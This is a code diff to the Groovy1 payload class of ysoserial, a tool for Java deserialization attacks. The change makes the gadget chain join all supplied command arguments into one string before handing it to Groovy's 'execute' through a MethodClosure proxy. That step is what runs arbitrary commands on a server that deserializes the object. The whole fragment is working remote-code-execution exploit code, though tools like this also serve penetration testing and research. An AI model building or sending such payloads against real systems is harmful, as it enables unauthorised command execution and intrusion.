@@ -1,8 +1,10 @@
 package ysoserial.payloads;
 
 import java.lang.reflect.InvocationHandler;
+import java.util.Arrays;
 import java.util.Map;
 
+import java.util.stream.Collectors;
 import org.codehaus.groovy.runtime.ConvertedClosure;
 import org.codehaus.groovy.runtime.MethodClosure;
 
@@ -32,7 +34,8 @@ import ysoserial.payloads.util.PayloadRunner;
 public class Groovy1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
 
 	public InvocationHandler getObject(final String ... command) throws Exception {
-		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(command[0], "execute"), "entrySet");
+		final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(Arrays.stream(command).collect(
+            Collectors.joining(" ")), "execute"), "entrySet");
 
 		final Map map = Gadgets.createProxy(closure, Map.class);
 
